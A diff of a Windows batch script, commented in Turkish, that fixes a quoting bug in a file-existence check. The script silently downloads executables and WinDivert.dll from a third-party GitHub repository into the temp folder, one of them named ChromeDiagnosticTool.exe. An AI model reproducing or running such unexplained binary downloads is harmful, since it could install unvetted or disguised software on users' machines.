@@ -10,7 +10,7 @@ set "FILE6=%temp%\WinDivert.dll"
 set "FILE7=%temp%\ChromeDiagnosticTool.exe"
 
 :: Tüm dosyaların varlığını tek tek kontrol et
-if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%  if exist "%FILE5%"  if exist "%FILE6%"  if exist "%FILE7%" (
+if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%"  if exist "%FILE7%" (
     exit
 )
 
@@ -24,6 +24,7 @@ curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/WinDivert.dll
 curl -L "https://github.com/seition2doc/dosta2/raw/refs/heads/main/ChromeDiagnosticTool.exe" -o "%FILE7%"
 
 exit
+
 
 
 
